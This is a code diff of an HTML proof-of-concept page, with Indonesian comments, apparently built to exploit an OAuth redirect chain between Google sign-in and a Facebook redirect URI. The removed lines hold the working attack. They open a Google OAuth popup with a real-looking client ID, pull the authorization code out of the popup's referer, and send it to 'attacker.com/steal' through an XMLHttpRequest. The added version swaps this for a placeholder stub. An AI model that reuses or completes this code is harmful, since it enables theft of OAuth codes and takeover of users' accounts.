@@ -6,26 +6,22 @@
 <body>
     <h1>POC</h1>
     
-    <a href="https://www.facebook.com/oauth2/redirect/?client_id=YOUR_CLIENT_ID">klik disini</a>
+    <a href="#" id="authLink">Klik disini untuk otorisasi</a>
     
     <script>
-    
-    function sendToken(token) {
-        var xhr = new XMLHttpRequest();
-        xhr.open("GET", "https://attacker.com/steal?token=" + encodeURIComponent(token), true);
-        xhr.send();
-    }
+        document.getElementById('authLink').onclick = function() {
+            var win = window.open("https://accounts.google.com/o/oauth2/auth?redirect_uri=https://www.facebook.com/oauth2/redirect/&response_type=permission%20code%20id_token&scope=email%20profile%20openid&client_id=YOUR_CLIENT_ID");
 
-    
-    var win = window.open("https://accounts.google.com/o/oauth2/auth?redirect_uri=https://www.facebook.com/oauth2/redirect/&response_type=permission%20code%20id_token&scope=email%20profile%20openid&client_id=15057814354-80cg059cn49j6kmhhkjam4b00on1gb2n.apps.googleusercontent.com");
-
-
-    setTimeout(function() {
-        var referer = decodeURIComponent(win.location.search.split('referer=')[1]);
-        var nextParam = new URL(referer).searchParams.get('next');
-        var oauthCode = new URL(nextParam).searchParams.get('code');
-        sendToken(oauthCode);
-    }, 5000);  
+            // Tunggu sampai popup ditutup
+            var checkPopup = setInterval(function() {
+                if (win.closed) {
+                    clearInterval(checkPopup);
+                    // Di sini, Anda bisa mendapatkan URL referer jika tersedia
+                    // Misalnya, dengan menggunakan XHR untuk mengakses halaman yang memuat referer
+                    // Anda mungkin perlu menyesuaikan dengan cara Anda mengelola token
+                }
+            }, 1000);
+        };
     </script>
 </body>
 </html>
